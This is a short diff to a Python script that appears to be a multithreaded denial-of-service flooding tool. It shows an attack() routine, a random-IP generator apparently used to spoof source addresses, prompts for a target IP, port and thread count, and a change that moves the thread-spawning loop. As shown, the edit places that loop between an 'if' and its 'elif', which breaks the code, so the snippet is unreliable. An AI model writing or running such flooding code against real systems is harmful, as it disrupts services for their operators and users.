@@ -29,9 +29,6 @@ def attack():
         print(attack_num)
 
         s.close()
-for i in range(Trd):
-    thread = threading.Thread(target = attack)
-    thread.start()
 def randomIP():
 	ip = ".".join(map(str, (randint(0,255)for _ in range(4))))
 	return ip
@@ -80,6 +77,9 @@ if option == 1:
 	port = int(input("Insert Port: "))
 	Trd = int(input("Insert Threads: "))
 	attack()
+for i in range(Trd):
+    thread = threading.Thread(target = attack)
+    thread.start()
 elif option == 2:
 	os.system("clear")
 	dstIP = str(raw_input("Target IP: "))
